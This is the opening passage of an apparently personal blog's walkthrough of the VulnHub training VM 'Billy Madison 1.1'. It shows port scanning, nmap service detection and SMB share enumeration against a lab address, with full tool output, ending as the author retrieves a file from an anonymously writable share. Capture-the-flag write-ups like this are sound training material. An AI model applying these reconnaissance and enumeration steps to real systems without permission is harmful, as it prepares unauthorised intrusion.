<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: sticky bit | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/sticky-bit/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2017-04-08T06:53:28-04:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[VulnHub] Billy Madison 1.1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2017/01/08/vulnhub-billy-madison-1-dot-1/"/>
    <updated>2017-01-08T01:55:38-05:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2017/01/08/vulnhub-billy-madison-1-dot-1</id>
    <content type="html"><![CDATA[<p>&ldquo;Objective: The primary objective of the VM is to figure out how Eric took over the machine and then undo his changes so you can recover Billy&rsquo;s 12th grade final project. You will probably need to root the box to complete this objective.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/brian-johnson,256/">Brian Johnson</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/billy-madison-11,161/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.128/24</em>)</p>

<p>Target: Billy Madison 1.1 (<em>10.1.1.129/24</em>)</p>

<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="https://www.wireshark.org/">wireshark</a></li>
<li><a href="http://www.sno.phy.queensu.ca/~phil/exiftool/">exiftool</a></li>
<li><a href="https://nmap.org/ncrack/">ncrack</a></li>
<li><a href="https://www.aircrack-ng.org/">aircrack-ng</a></li>
<li><a href="https://github.com/lvaccaro/truecrack">truecrack</a></li>
<li><a href="https://veracrypt.codeplex.com/">veracrypt</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.129  00:0c:29:84:da:45   VMware, Inc.
</span><span class='line'>10.1.1.250  00:50:56:f9:1b:7d   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.425 seconds <span class="o">(</span>105.57 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.129</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.129/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-12-12 11:05:27 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.129                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 23/tcp on 10.1.1.129                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 139/tcp on 10.1.1.129                                   &lt;br/&gt;
</span><span class='line'>Discovered open port 69/tcp on 10.1.1.129                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 445/tcp on 10.1.1.129                                   &lt;br/&gt;
</span><span class='line'>Discovered open port 2525/tcp on 10.1.1.129                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.129 &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> turncated <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.129
</span><span class='line'>Host is up <span class="o">(</span>0.00032s latency<span class="o">)</span>.
</span><span class='line'>PORT     STATE SERVICE     VERSION
</span><span class='line'>22/tcp   open  tcpwrapped
</span><span class='line'>23/tcp   open  telnet?
</span><span class='line'>69/tcp   open  http        BaseHTTPServer
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-generator: WordPress 1.0
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: HEAD GET POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: MadisonHotelsWordpress
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Welcome <span class="p">|</span> Just another WordPress site
</span><span class='line'>80/tcp   open  http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-title: Oh nooooooo!
</span><span class='line'>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span><span class='line'>445/tcp  open  netbios-ssn Samba smbd 4.3.9-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span><span class='line'>2525/tcp open  smtp
</span><span class='line'><span class="p">|</span> smtp-commands: BM, 8BITMIME, AUTH LOGIN, Ok,
</span><span class='line'><span class="p">|</span>&lt;/em&gt; SubEthaSMTP null on BM Topics: HELP HELO RCPT MAIL DATA AUTH EHLO NOOP RSET VRFY QUIT STARTTLS For more info use <span class="p">&amp;</span>ldquo<span class="p">;</span>HELP &lt;topic&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>. End of HELP info
</span><span class='line'><span class="m">2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org/cgi-bin/submit.cgi?new-service&quot;</span>&gt;https://nmap.org/cgi-bin/submit.cgi?new-service&lt;/a&gt; :
</span><span class='line'><span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
</span><span class='line'>SF-Port23-TCP:V<span class="o">=</span>7.31%I<span class="o">=</span>7%D<span class="o">=</span>12/12%Time<span class="o">=</span>584E8537%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NUL
</span><span class='line'>SF:L,E6,<span class="p">&amp;</span>ldquo<span class="p">;</span><span class="se">\n\n</span>*****<span class="se">\x</span>20HAHAH!<span class="se">\x</span>20You<span class="p">&amp;</span>rsquo<span class="p">;</span>re<span class="se">\x</span>20banned<span class="se">\x</span>20for<span class="se">\x</span>20a<span class="se">\x</span>20while
</span><span class='line'>SF:,<span class="se">\x</span>20Billy<span class="se">\x</span>20Boy!<span class="se">\x</span>20<span class="se">\x</span>20By<span class="se">\x</span>20the<span class="se">\x</span>20way,<span class="se">\x</span>20I<span class="se">\x</span>20caught<span class="se">\x</span>20you<span class="se">\x</span>20tr
</span><span class='line'>SF:ying<span class="se">\x</span>20to<span class="se">\x</span>20hack<span class="se">\x</span>20my<span class="se">\x</span>20wifi<span class="se">\x</span>20-<span class="se">\x</span>20but<span class="se">\x</span>20the<span class="se">\x</span>20joke<span class="p">&amp;</span>rsquo<span class="p">;</span>s<span class="se">\x</span>20on<span class="se">\x</span>20
</span><span class='line'>SF:you!<span class="se">\x</span>20I<span class="se">\x</span>20don<span class="p">&amp;</span>rsquo<span class="p">;</span>t<span class="se">\x</span>20use<span class="se">\x</span>20ROTten<span class="se">\x</span>20passwords<span class="se">\x</span>20like<span class="se">\x</span>20rkfpuzrahng
</span><span class='line'>SF:vat<span class="se">\x</span>20anymore!<span class="se">\x</span>20Madison<span class="se">\x</span>20Hotels<span class="se">\x</span>20is<span class="se">\x</span>20as<span class="se">\x</span>20good<span class="se">\x</span>20as<span class="se">\x</span>20MINE!
</span><span class='line'>SF:!!!<span class="se">\x</span>20*****<span class="se">\n\n</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
</span><span class='line'>SF-Port2525-TCP:V<span class="o">=</span>7.31%I<span class="o">=</span>7%D<span class="o">=</span>12/12%Time<span class="o">=</span>584E853D%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>N
</span><span class='line'>SF:ULL,1F,<span class="p">&amp;</span>ldquo<span class="p">;</span>220<span class="se">\x</span>20BM<span class="se">\x</span>20ESMTP<span class="se">\x</span>20SubEthaSMTP<span class="se">\x</span>20null<span class="se">\r\n</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,5A
</span><span class='line'>SF:,<span class="p">&amp;</span>ldquo<span class="p">;</span>220<span class="se">\x</span>20BM<span class="se">\x</span>20ESMTP<span class="se">\x</span>20SubEthaSMTP<span class="se">\x</span>20null<span class="se">\r\n</span>500<span class="se">\x</span>20Error:<span class="se">\x</span>20command
</span><span class='line'>SF:<span class="se">\x</span>20not<span class="se">\x</span>20implemented<span class="se">\r\n</span>500<span class="se">\x</span>20Error:<span class="se">\x</span>20bad<span class="se">\x</span>20syntax<span class="se">\r\n</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>%r<span class="o">(</span>Generi
</span><span class='line'>SF:cLines,4D,<span class="p">&amp;</span>ldquo<span class="p">;</span>220<span class="se">\x</span>20BM<span class="se">\x</span>20ESMTP<span class="se">\x</span>20SubEthaSMTP<span class="se">\x</span>20null<span class="se">\r\n</span>500<span class="se">\x</span>20Error:<span class="se">\x</span>
</span><span class='line'>SF:20bad<span class="se">\x</span>20syntax<span class="se">\r\n</span>500<span class="se">\x</span>20Error:<span class="se">\x</span>20bad<span class="se">\x</span>20syntax<span class="se">\r\n</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>%r<span class="o">(</span>Help,13D,<span class="p">&amp;</span>ldquo<span class="p">;</span>220
</span><span class='line'>SF:<span class="se">\x</span>20BM<span class="se">\x</span>20ESMTP<span class="se">\x</span>20SubEthaSMTP<span class="se">\x</span>20null<span class="se">\r\n</span>214-SubEthaSMTP<span class="se">\x</span>20null<span class="se">\x</span>20on
</span><span class='line'>SF:<span class="se">\x</span>20BM<span class="se">\r\n</span>214-Topics:<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20HELP<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>
</span><span class='line'>SF:20<span class="se">\x</span>20<span class="se">\x</span>20HELO<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20RCPT<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\</span>
</span><span class='line'>SF:x20MAIL<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20DATA<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20AUTH
</span><span class='line'>SF:<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20EHLO<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20NOOP<span class="se">\r\n</span>214
</span><span class='line'>SF:-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20RSET<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20VRFY<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>
</span><span class='line'>SF:20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20QUIT<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20STARTTLS<span class="se">\r\n</span>214-For<span class="se">\x</span>20mo
</span><span class='line'>SF:re<span class="se">\x</span>20info<span class="se">\x</span>20use<span class="se">\x</span>20<span class="se">\&quot;</span>HELP<span class="se">\x</span>20&lt;topic&gt;<span class="se">\&amp;</span>rdquo<span class="p">;</span>.<span class="se">\r\n</span>214<span class="se">\x</span>20End<span class="se">\x</span>20of<span class="se">\x</span>20HELP<span class="se">\</span>
</span><span class='line'>SF:x20info<span class="se">\r\n</span><span class="s2">&quot;);</span>
</span><span class='line'><span class="s2">MAC Address: 00:0C:29:84:DA:45 (VMware)</span>
</span><span class='line'><span class="s2">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span>
</span><span class='line'><span class="s2">Device type: general purpose</span>
</span><span class='line'><span class="s2">Running: OpenBSD 4.X</span>
</span><span class='line'><span class="s2">OS CPE: cpe:/o:openbsd:openbsd:4.4</span>
</span><span class='line'><span class="s2">OS details: OpenBSD 4.4</span>
</span><span class='line'><span class="s2">Network Distance: 1 hop</span>
</span><span class='line'><span class="s2">Service Info: Host: BM&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="s2">&lt;p&gt;Host script results:</span>
</span><span class='line'><span class="s2">|&lt;em&gt;clock-skew: mean: 6s, deviation: 0s, median: 6s</span>
</span><span class='line'><span class="s2">| smb-os-discovery:</span>
</span><span class='line'><span class="s2">|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)</span>
</span><span class='line'><span class="s2">|   Computer name: bm</span>
</span><span class='line'><span class="s2">|   NetBIOS computer name: BM</span>
</span><span class='line'><span class="s2">|   Domain name:</span>
</span><span class='line'><span class="s2">|   FQDN: bm</span>
</span><span class='line'><span class="s2">|&lt;/em&gt;  System time: 2016-12-12T05:09:11-06:00</span>
</span><span class='line'><span class="s2">| smb-security-mode:</span>
</span><span class='line'><span class="s2">|   account_used: guest</span>
</span><span class='line'><span class="s2">|   authentication_level: user</span>
</span><span class='line'><span class="s2">|   challenge_response: supported</span>
</span><span class='line'><span class="s2">|&lt;em&gt;  message_signing: disabled (dangerous, but default)</span>
</span><span class='line'><span class="s2">|&lt;/em&gt;smbv2-enabled: Server supports SMBv2 protocol&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="s2">&lt;p&gt;TRACEROUTE</span>
</span><span class='line'><span class="s2">HOP RTT     ADDRESS</span>
</span><span class='line'><span class="s2">1   0.32 ms 10.1.1.129&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="s2">&lt;p&gt;NSE: Script Post-scanning.</span>
</span><span class='line'><span class="s2">Initiating NSE at 06:09</span>
</span><span class='line'><span class="s2">Completed NSE at 06:09, 0.00s elapsed</span>
</span><span class='line'><span class="s2">Initiating NSE at 06:09</span>
</span><span class='line'><span class="s2">Completed NSE at 06:09, 0.00s elapsed</span>
</span><span class='line'><span class="s2">Post-scan script results:</span>
</span><span class='line'><span class="s2">| clock-skew:</span>
</span><span class='line'><span class="s2">|_  6s: Majority of systems scanned</span>
</span><span class='line'><span class="s2">Read data files from: /usr/bin/../share/nmap</span>
</span><span class='line'><span class="s2">OS and Service detection performed. Please report any incorrect results at &lt;a href=&quot;</span>https://nmap.org/submit/<span class="err">&quot;</span>&gt;https://nmap.org/submit/&lt;/a&gt; .
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 66.96 seconds
</span><span class='line'>           Raw packets sent: <span class="m">48</span> <span class="o">(</span>4.616KB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">16</span> <span class="o">(</span>656B<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Well, from the result of nmap, there are multiple vectors/ports are interesting, and I choose to test <code>smb</code> first.</p>

<p>Then I use <code>nmap</code> with script <code>smb-enum-shares.nse</code> to enumerate shares.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -v <span class="p">&amp;</span>ndash<span class="p">;</span>script smb-enum-shares.nse -p445 10.1.1.129&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting Nmap 7.31 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org&quot;</span>&gt;https://nmap.org&lt;/a&gt; <span class="o">)</span> at 2016-12-12 06:26 EST
</span><span class='line'>NSE: Loaded <span class="m">1</span> scripts <span class="k">for</span> scanning.
</span><span class='line'>NSE: Script Pre-scanning.
</span><span class='line'>Initiating NSE at 06:26
</span><span class='line'>Completed NSE at 06:26, 0.00s elapsed
</span><span class='line'>Initiating ARP Ping Scan at 06:26
</span><span class='line'>Scanning 10.1.1.129 <span class="o">[</span><span class="m">1</span> port<span class="o">]</span>
</span><span class='line'>Completed ARP Ping Scan at 06:26, 0.04s elapsed <span class="o">(</span><span class="m">1</span> total hosts<span class="o">)</span>
</span><span class='line'>Initiating Parallel DNS resolution of <span class="m">1</span> host. at 06:26
</span><span class='line'>Completed Parallel DNS resolution of <span class="m">1</span> host. at 06:26, 0.00s elapsed
</span><span class='line'>Initiating SYN Stealth Scan at 06:26
</span><span class='line'>Scanning 10.1.1.129 <span class="o">[</span><span class="m">1</span> port<span class="o">]</span>
</span><span class='line'>Discovered open port 445/tcp on 10.1.1.129
</span><span class='line'>Completed SYN Stealth Scan at 06:26, 0.04s elapsed <span class="o">(</span><span class="m">1</span> total ports<span class="o">)</span>
</span><span class='line'>NSE: Script scanning 10.1.1.129.
</span><span class='line'>Initiating NSE at 06:26
</span><span class='line'>Completed NSE at 06:26, 13.32s elapsed
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.129
</span><span class='line'>Host is up <span class="o">(</span>0.00023s latency<span class="o">)</span>.
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>445/tcp open  microsoft-ds
</span><span class='line'>MAC Address: 00:0C:29:84:DA:45 <span class="o">(</span>VMware<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Host script results:
</span><span class='line'><span class="p">|</span> smb-enum-shares:
</span><span class='line'><span class="p">|</span>   account_used: guest
</span><span class='line'><span class="p">|</span>   EricsSecretStuff:
</span><span class='line'><span class="p">|</span>     Type: STYPE_DISKTREE
</span><span class='line'><span class="p">|</span>     Comment:
</span><span class='line'><span class="p">|</span>     Users: 0
</span><span class='line'><span class="p">|</span>     Max Users: &lt;unlimited&gt;
</span><span class='line'><span class="p">|</span>     Path: C:<span class="se">\h</span>ome<span class="se">\W</span>easelLaugh
</span><span class='line'><span class="p">|</span>     Anonymous access: READ/WRITE
</span><span class='line'><span class="p">|</span>     Current user access: READ/WRITE
</span><span class='line'><span class="p">|</span>   IPC<span class="nv">$:</span>
</span><span class='line'><span class="p">|</span>     Type: STYPE_IPC_HIDDEN
</span><span class='line'><span class="p">|</span>     Comment: IPC Service <span class="o">(</span>BM<span class="o">)</span>
</span><span class='line'><span class="p">|</span>     Users: 1
</span><span class='line'><span class="p">|</span>     Max Users: &lt;unlimited&gt;
</span><span class='line'><span class="p">|</span>     Path: C:<span class="se">\t</span>mp
</span><span class='line'><span class="p">|</span>     Anonymous access: READ/WRITE
</span><span class='line'><span class="p">|</span>_    Current user access: READ/WRITE&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;NSE: Script Post-scanning.
</span><span class='line'>Initiating NSE at 06:26
</span><span class='line'>Completed NSE at 06:26, 0.00s elapsed
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.79 seconds
</span><span class='line'>           Raw packets sent: <span class="m">2</span> <span class="o">(</span>72B<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">2</span> <span class="o">(</span>72B<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Here I found that <code>EricsSecretStuff</code> can be access/write anonymously!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# smbclient <span class="se">\\</span>10.1.1.129<span class="se">\E</span>ricsSecretStuff<span class="se">\</span>
</span><span class='line'>WARNING: The <span class="p">&amp;</span>ldquo<span class="p">;</span>syslog<span class="p">&amp;</span>rdquo<span class="p">;</span> option is deprecated
</span><span class='line'>Enter root<span class="p">&amp;</span>rsquo<span class="p">;</span>s password:
</span><span class='line'><span class="nv">Domain</span><span class="o">=[</span>WORKGROUP<span class="o">]</span> <span class="nv">OS</span><span class="o">=[</span>Windows 6.1<span class="o">]</span> <span class="nv">Server</span><span class="o">=[</span>Samba 4.3.9-Ubuntu<span class="o">]</span>
</span><span class='line'>smb: &gt; ls
</span><span class='line'>  .                                   D        <span class="m">0</span>  Mon Dec <span class="m">12</span> 17:03:27 2016
</span><span class='line'>  ..                                  D        <span class="m">0</span>  Sat Aug <span class="m">20</span> 14:56:45 2016
</span><span class='line'>  ._.DS_Store                        AH     <span class="m">4096</span>  Wed Aug <span class="m">17</span> 10:32:07 2016
</span><span class='line'>  ebd.txt                             N       <span class="m">35</span>  Mon Dec <span class="m">12</span> 17:03:27 2016
</span><span class='line'>  .DS_Store                          AH     <span class="m">6148</span>  Wed Aug <span class="m">17</span> 10:32:12 2016&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;    <span class="m">30291996</span> blocks of size 1024. <span class="m">25919088</span> blocks available
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;smb: &gt; get ebd.txt
